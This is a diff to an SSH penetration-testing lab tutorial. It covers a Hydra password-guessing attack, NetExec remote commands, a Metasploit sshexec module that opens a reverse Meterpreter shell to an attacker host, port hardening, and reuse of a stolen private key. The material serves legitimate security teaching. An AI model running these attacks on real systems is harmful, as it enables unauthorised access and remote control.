@@ -80,6 +80,8 @@ Reading state information... Done
 All packages are up to date.
 ```
 
+The `apt update` command refreshes the local package index from Ubuntu's repositories so that the package manager knows the latest available version of `openssh-server` and its dependencies. With the index updated, we can install the server package itself:
+
 ```bash
 sudo apt install openssh-server
 ```
@@ -155,6 +157,8 @@ Jan 11 09:52:41 ubuntu-lab sshd[812]: Server listening on 0.0.0.0 port 22.
 Jan 11 09:52:41 ubuntu-lab sshd[812]: Server listening on :: port 22.
 Jan 11 09:52:41 ubuntu-lab systemd[1]: Started OpenBSD Secure Shell server.
 ```
+
+The `systemctl status` output confirms that `ssh.service` is both `enabled` (configured to start on boot) and `active (running)` with PID 812, and its log lines already hint that it is listening on port 22 across both IPv4 and IPv6. We can verify the exact listening sockets directly at the network layer with `ss`:
 
 ```bash
 ss -tlnp | grep sshd
@@ -293,6 +297,8 @@ pentest
 ubuntu
 ```
 
+The `users.txt` file contains four candidate usernames representing common administrative, default distribution, and lab accounts. Next, we inspect the candidate password list in `pass.txt`:
+
 ```bash
 cat pass.txt
 ```
@@ -308,6 +314,8 @@ ubuntu
 letmein
 ```
 
+The `pass.txt` file holds six weak, high-frequency passwords that routinely appear at the top of breach corpora. Before launching the attack, we can count the lines in both files with `wc -l` to see how many total combinations our wordlists represent:
+
 ```bash
 wc -l users.txt pass.txt
 ```
@@ -318,6 +326,8 @@ wc -l users.txt pass.txt
 4 users.txt
 6 pass.txt
 ```
+
+Four usernames multiplied by six passwords yields 24 base combinations (or 28 when a tool also tests default empty/username variations), which is small enough to finish in a couple of seconds in the lab.
 
 ### 4.1 Dictionary attack with Hydra
 
@@ -402,6 +412,8 @@ id
 uid=1001(pentest) gid=1001(pentest) groups=1001(pentest),27(sudo)
 ```
 
+The `id` output confirms that `pentest` is a standard non-root user (`uid=1001`) who also belongs to supplementary group `27(sudo)`. To see what commands that group membership actually permits without prompting for a password, we run `sudo -ln`:
+
 ```bash
 sudo -ln
 ```
@@ -460,6 +472,14 @@ Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)
 Last login: Thu Jan 11 09:58:02 2024 from 192.168.1.9
 ```
 
+The host-key prompt is the client's protection against man-in-the-middle attacks, and it is worth understanding rather than clicking through. On first contact the client has never seen the server's public host key, so it can only print the fingerprint and ask whether you trust it.
+
+In a lab where you built both machines, answering `yes` is correct. On an engagement the right answer is to verify the fingerprint out of band, because accepting whatever key you are offered is exactly the behaviour an SSH interception depends on.
+
+Once accepted, the key is stored in `~/.ssh/known_hosts` and every later connection is checked against it. If the key ever changes, the client refuses to connect and warns loudly — which should make you stop and investigate rather than delete the entry.
+
+After the fingerprint prompt comes the password prompt, and then the server's login banner. From an assessment point of view that banner is a gift: it confirms the operating system version (`22.04.3 LTS`), the kernel (`5.15.0-91-generic`) and the machine's primary address, all without running a single command. Once the remote shell prompt appears, we can verify our user identity and group memberships:
+
 ```bash
 id
 ```
@@ -470,15 +490,7 @@ id
 uid=1001(pentest) gid=1001(pentest) groups=1001(pentest),27(sudo)
 ```
 
-The host-key prompt is the client's protection against man-in-the-middle attacks, and it is worth understanding rather than clicking through. On first contact the client has never seen the server's public host key, so it can only print the fingerprint and ask whether you trust it.
-
-In a lab where you built both machines, answering `yes` is correct. On an engagement the right answer is to verify the fingerprint out of band, because accepting whatever key you are offered is exactly the behaviour an SSH interception depends on.
-
-Once accepted, the key is stored in `~/.ssh/known_hosts` and every later connection is checked against it. If the key ever changes, the client refuses to connect and warns loudly — which should make you stop and investigate rather than delete the entry.
-
-After the fingerprint prompt comes the password prompt, and then the server's login banner. From an assessment point of view that banner is a gift: it confirms the operating system version (`22.04.3 LTS`), the kernel (`5.15.0-91-generic`) and the machine's primary address, all without running a single command.
-
-The prompt that follows, `pentest@ubuntu-lab:~$`, shows the user, the hostname and the current directory, and the `$` confirms we are an ordinary user rather than root. Running `id` confirms the group membership we already suspected from NetExec.
+Running `id` inside the interactive session confirms that we are logged in as `pentest` (`uid=1001`) and belong to the `sudo` group (`27(sudo)`), matching what NetExec reported earlier.
 
 <details>
 <summary><strong>Read more</strong> — the banner as a finding, and what makes this session valuable</summary>
@@ -520,11 +532,13 @@ The command itself is unremarkable — `ifconfig` prints the interface configura
 The remote command runs in a non-interactive shell: there is no pseudo-terminal unless you ask for one with `-t`. Standard output and standard error are forwarded back over the encrypted channel, and the exit status of the remote command becomes the exit status of the local `ssh` process.
 
 <details>
-<summary><strong>Read more</strong> — quoting rules, TTY allocation, and the NetExec equivalent</summary>
+<summary><strong>Read more</strong> — quoting rules and TTY allocation</summary>
 
 The quoting rules are the part beginners get wrong. `ssh host 'cmd'` sends the literal string to the remote shell, so `$VAR`, backticks and globs are expanded *remotely*; `ssh host "cmd"` lets your local shell expand them first. When a remote command must run as a different user, `sudo` on the far end usually needs `-t` to allocate a terminal, giving `ssh -t pentest@192.168.1.9 'sudo -i'`.
 
 Because the exit status is propagated, the construct is usable in scripts: `ssh host 'test -f /etc/shadow' && echo present` works exactly as you would hope.
+
+</details>
 
 The same idea is available without the SSH client through NetExec's `-x` flag, which logs in over SSH, executes the command and prints the output inline:
 
@@ -543,8 +557,6 @@ nxc ssh 192.168.1.9 -u pentest -p 123 -x 'cat /tmp/file.txt'
 
 The transcript shows NetExec's three-step rhythm: an informational line announcing the server banner, a success marker for authentication, and then `Executed command` followed by the output. Because authentication is re-established for each invocation, this style suits a quick, non-interactive sweep of a host.
 
-</details>
-
 ### 5.3 Meterpreter over SSH with `exploit/multi/ssh/sshexec`
 
 An interactive shell is enough for most of what follows, but it has limits. It is noisy in the sense that a shell process is visible to any user who runs `w` or `who`, it depends on the remote machine's own tools, and it does not survive a network hiccup.
@@ -552,28 +564,42 @@ An interactive shell is enough for most of what follows, but it has limits. It i
 Metasploit's `exploit/multi/ssh/sshexec` module takes a different approach: it authenticates over SSH like a normal client, then uses that authenticated channel to *stage and execute a payload*, giving you a Meterpreter session — a rich post-exploitation environment that lives in memory.
 
 ```bash
-msfconsole -q
+sudo msfconsole -q
+```
+
+The `-q` flag starts the Metasploit console quietly without printing the random ASCII banner, dropping us straight into the `msf6 >` prompt. From there, we select the `exploit/multi/ssh/sshexec` module and configure the target address, credentials, target architecture index, payload, and local listener IP:
+
+```bash
+use exploit/multi/ssh/sshexec
+set rhosts 192.168.1.9
+set username pentest
+set password 123
+set target 1
+set payload linux/x86/meterpreter/reverse_tcp
+set lhost 192.168.1.17
 ```
 
 **Output:**
 
 ```text
-msf6 > use exploit/multi/ssh/sshexec
 [*] No payload configured, defaulting to cmd/linux/http/x64/meterpreter/reverse_tcp
-msf6 exploit(multi/ssh/sshexec) > set rhosts 192.168.1.9
 rhosts => 192.168.1.9
-msf6 exploit(multi/ssh/sshexec) > set username pentest
 username => pentest
-msf6 exploit(multi/ssh/sshexec) > set password 123
 password => 123
-msf6 exploit(multi/ssh/sshexec) > set target 1
 target => 1
-msf6 exploit(multi/ssh/sshexec) > set payload linux/x86/meterpreter/reverse_tcp
 payload => linux/x86/meterpreter/reverse_tcp
-msf6 exploit(multi/ssh/sshexec) > set lhost 192.168.1.17
 lhost => 192.168.1.17
-msf6 exploit(multi/ssh/sshexec) > run
+```
 
+Working through the setup: `rhosts`, `username` and `password` are the same three facts we already recovered, and `lhost` is the attacker address the payload should call home to. Setting `target 1` selects the 32-bit Linux x86 target, paired with the matching `linux/x86/meterpreter/reverse_tcp` payload. With every required option in place, we launch the module:
+
+```bash
+run
+```
+
+**Output:**
+
+```text
 [*] Started reverse TCP handler on 192.168.1.17:4444 
 [*] 192.168.1.9:22 - Sending stager...
 [*] Command Stager progress -  12.21% done (61/500 bytes)
@@ -582,10 +608,29 @@ msf6 exploit(multi/ssh/sshexec) > run
 [*] Command Stager progress - 100.00% done (500/500 bytes)
 [*] Sending stage (1017704 bytes) to 192.168.1.9
 [*] Meterpreter session 1 opened (192.168.1.17:4444 -> 192.168.1.9:49328) at 2024-01-11 10:14:52 +0000
+```
 
-meterpreter > getuid
+The module logs in over SSH, delivers the 500-byte command stager in four chunks, streams the full 1 MB Meterpreter stage over the reverse connection to `192.168.1.17:4444`, and drops us into the `meterpreter >` prompt for session 1. Inside Meterpreter, we first check which account the session is running as:
+
+```bash
+getuid
+```
+
+**Output:**
+
+```text
 Server username: pentest
-meterpreter > sysinfo
+```
+
+The `getuid` command confirms that our memory-resident payload is executing under the `pentest` user context. Next, we query the host's operating system and architecture using Meterpreter's built-in `sysinfo` command:
+
+```bash
+sysinfo
+```
+
+**Output:**
+
+```text
 Computer     : ubuntu-lab
 OS           : Ubuntu 22.04 (Linux 5.15.0-91-generic)
 Architecture : x86_64
@@ -593,7 +638,7 @@ BuildTuple   : i486-linux-musl
 Meterpreter  : x86/linux
 ```
 
-Working through the setup: `rhosts`, `username` and `password` are the same three facts we already recovered, and `lhost` is the attacker address the payload should call home to. The two settings that need explanation are `target` and `payload`.
+The `sysinfo` output reports the hostname (`ubuntu-lab`), operating system (`Ubuntu 22.04`), kernel (`5.15.0-91-generic`), and 64-bit host architecture (`x86_64`), all gathered directly by the `x86/linux` Meterpreter payload without spawning external system binaries.
 
 <details>
 <summary><strong>Read more</strong> — the target list, the stager, and the trade-offs</summary>
@@ -622,6 +667,8 @@ The change is made in the server configuration file, `/etc/ssh/sshd_config`. The
 cd /etc/ssh
 ```
 
+After moving into `/etc/ssh`, we list the directory contents to see the configuration files and host key pairs stored there:
+
 ```bash
 ls
 ```
@@ -634,6 +681,8 @@ ssh_host_ed25519_key  ssh_host_ed25519_key.pub  ssh_host_rsa_key
 ssh_host_rsa_key.pub  sshd_config  sshd_config.d
 ```
 
+Alongside the server's ECDSA, Ed25519, and RSA host keys, we see `ssh_config` (for the local SSH client) and `sshd_config` (for the SSH daemon). Before opening `sshd_config` in an editor, we can use `grep -n` to locate the exact line numbers for the `Port` and `PasswordAuthentication` directives:
+
 ```bash
 grep -n "^#Port\|^Port\|^#PasswordAuthentication\|^PasswordAuthentication" sshd_config
 ```
@@ -645,26 +694,36 @@ grep -n "^#Port\|^Port\|^#PasswordAuthentication\|^PasswordAuthentication" sshd_
 58:#PasswordAuthentication yes
 ```
 
+The `grep` output tells the whole story before the editor even opens. `#Port 22` on line 13 documents the compiled-in default of 22, and the daemon is listening on 22 because nothing has overridden it. `#PasswordAuthentication yes` on line 58 does the same for password authentication — because the line is commented, the package default governs, and that default is to accept passwords. We now open `sshd_config` with `sudo nano` to edit the port directive:
+
 ```bash
 sudo nano sshd_config
 ```
 
-The `grep` output tells the whole story before the editor even opens. `#Port 22` on line 13 documents the compiled-in default of 22, and the daemon is listening on 22 because nothing has overridden it. `#PasswordAuthentication yes` on line 58 does the same for password authentication — because the line is commented, the package default governs, and that default is to accept passwords.
+Inside `nano` you would delete the leading `#` on line 13 and change the port number, leaving the line as:
 
-Inside `nano` you would delete the leading `#` and the space, and change the port number, leaving the line as:
-
-```
+```text
 Port 2222
 ```
+
+Uncommenting the directive and changing its value to `2222` instructs `sshd` to bind to TCP port 2222 instead of the default port 22 the next time the service starts.
 
 <details>
 <summary><strong>Read more</strong> — working in `nano`, and restarting without locking yourself out</summary>
 
-The `nano` shortcuts are worth committing to memory if you are new to the editor: `Ctrl+W` searches for text (the fastest way to find line 58 in a file of 130 lines), `Ctrl+O` followed by Enter saves, `Ctrl+X` exits, and the bottom of the screen always shows the current menu. Once the file is saved, the daemon has to be told to re-read it:
+The `nano` shortcuts are worth committing to memory if you are new to the editor: `Ctrl+W` searches for text (the fastest way to find line 58 in a file of 130 lines), `Ctrl+O` followed by Enter saves, `Ctrl+X` exits, and the bottom of the screen always shows the current menu.
+
+A `restart` drops every existing listening instance, so on a remote production host the safe sequence is to validate the new configuration first (`sudo sshd -t`), keep the current session open as a fallback, and restart from a console or a second connection. A configuration error combined with a restart on the only session you have is the classic way to lock yourself out of a server.
+
+</details>
+
+Once the file is saved, the daemon has to be restarted so that it re-reads `sshd_config` and binds to the new port:
 
 ```bash
 sudo systemctl restart ssh
 ```
+
+After restarting the service, we inspect the listening TCP sockets again with `ss -tlnp` to verify that `sshd` has moved to port 2222:
 
 ```bash
 ss -tlnp | grep sshd
@@ -677,9 +736,7 @@ LISTEN 0      128          0.0.0.0:2222      0.0.0.0:*    users:(("sshd",pid=231
 LISTEN 0      128             [::]:2222         [::]:*    users:(("sshd",pid=2317,fd=4))
 ```
 
-The process ID has changed from 812 to 2317, which confirms that the old daemon really was replaced rather than merely reloaded, and port 22 no longer appears in the listening sockets. A `restart` drops every existing session, so on a remote production host the safe sequence is to validate the new configuration first (`sudo sshd -t`), keep the current session open as a fallback, and restart from a console or a second connection. A configuration error combined with a restart on the only session you have is the classic way to lock yourself out of a server.
-
-</details>
+The process ID has changed from 812 to 2317, which confirms that the old daemon really was replaced rather than merely reloaded, and port 22 no longer appears in the listening sockets.
 
 From the attacker's side the change is almost invisible. The same version scan, pointed at the new port, returns the same information:
 
@@ -777,6 +834,8 @@ The key's randomart image is:
 +----[SHA256]-----+
 ```
 
+The `ssh-keygen` output confirms that a 3072-bit RSA key pair has been generated, encrypted with the passphrase we entered, and saved as `/home/pentest/.ssh/id_rsa` (private key) and `/home/pentest/.ssh/id_rsa.pub` (public key). We can now list the `.ssh` directory to inspect the two newly created files and their permissions:
+
 ```bash
 ls -l .ssh
 ```
@@ -812,6 +871,8 @@ That file is a plain list of public keys, one per line, and every key in it is a
 cd .ssh
 ```
 
+Once inside `~/.ssh`, we run `ls -la` to check the permissions on the directory itself as well as the existing key files before creating `authorized_keys`:
+
 ```bash
 ls -la
 ```
@@ -826,9 +887,13 @@ drwxr-x--- 5 pentest pentest 4096 Jan 11 10:20 ..
 -rw-r--r-- 1 pentest pentest  572 Jan 11 10:25 id_rsa.pub
 ```
 
+The directory is owned by `pentest` with mode `0700` (`drwx------`), and no `authorized_keys` file exists yet. We now append the contents of `id_rsa.pub` into `authorized_keys` to authorise the key pair for this account:
+
 ```bash
 cat id_rsa.pub >> authorized_keys
 ```
+
+After appending the public key, we list the directory contents again to confirm that `authorized_keys` was created with the expected size and permissions:
 
 ```bash
 ls -l
@@ -842,6 +907,8 @@ total 16
 -rw------- 1 pentest pentest 2655 Jan 11 10:25 id_rsa
 -rw-r--r-- 1 pentest pentest  572 Jan 11 10:25 id_rsa.pub
 ```
+
+The new `authorized_keys` file is exactly 572 bytes — matching `id_rsa.pub` byte for byte — and is readable and writable only by `pentest` (`-rw-------`). We can inspect the line inside `authorized_keys` with `cat`:
 
 ```bash
 cat authorized_keys
@@ -964,6 +1031,8 @@ ls -l id_rsa
 -rw-r--r-- 1 root root 2655 Jan 11 10:34 id_rsa
 ```
 
+The `ls -l` output shows that the stolen `id_rsa` file on the attacker's disk currently has mode `0644` (`-rw-r--r--`), making it world-readable. Watch what happens when we try to authenticate with `-i id_rsa` while those permissions are still in place:
+
 ```bash
 ssh -i id_rsa pentest@192.168.1.9
 ```
@@ -981,9 +1050,13 @@ Load key "id_rsa": bad permissions
 pentest@192.168.1.9: Permission denied (publickey).
 ```
 
+The SSH client refuses to load `id_rsa` because permissions `0644` allow other local users to read the private key, and since password authentication is disabled on the server, the connection fails immediately with `Permission denied (publickey)`. To satisfy the client's security check, we restrict the file permissions to `0600` (owner read/write only):
+
 ```bash
 chmod 600 id_rsa
 ```
+
+With the permissions locked down to `0600`, we run the exact same `ssh -i` command again:
 
 ```bash
 ssh -i id_rsa pentest@192.168.1.9
